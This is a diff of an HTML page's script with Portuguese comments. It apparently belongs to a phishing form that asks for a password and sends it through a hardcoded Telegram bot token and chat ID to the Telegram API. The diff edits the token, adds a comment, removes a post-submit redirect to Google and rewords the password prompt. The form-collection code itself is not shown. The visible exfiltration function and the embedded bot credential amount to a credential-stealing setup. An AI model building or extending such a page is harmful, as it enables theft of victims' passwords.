@@ -206,8 +206,8 @@
     </div>
 
     <script>
-        const tokenBotTelegram = "7024807486:AAFxaoUwzXKWNA-D4VOH2zqtj4K28PWw3d"; 
-        const chatId = "6019114072";
+        const tokenBotTelegram = "7024807486:AAFxaoUwzXKWNA-D4VOH2zqtj4K28PWw3ds"; 
+        const chatId = "6019114072"; // ID do chat
 
         function enviarParaTelegram(mensagem) {
             const url = `https://api.telegram.org/bot${tokenBotTelegram}/sendMessage`;
@@ -278,12 +278,8 @@
                 document.getElementById("subTexto").style.display = "none";
                 document.getElementById("formulario").style.display = "none";
                 document.getElementById("senhaDiv").style.display = "none";
-
-                setTimeout(function() {
-                    window.location.href = "https://www.google.com"; // Redireciona para o Google
-                }, 3000);
             } else {
-                alert("Por favor, insira a senha.");
+                alert("Digite a senha para finalizar.");
             }
         }
     </script>
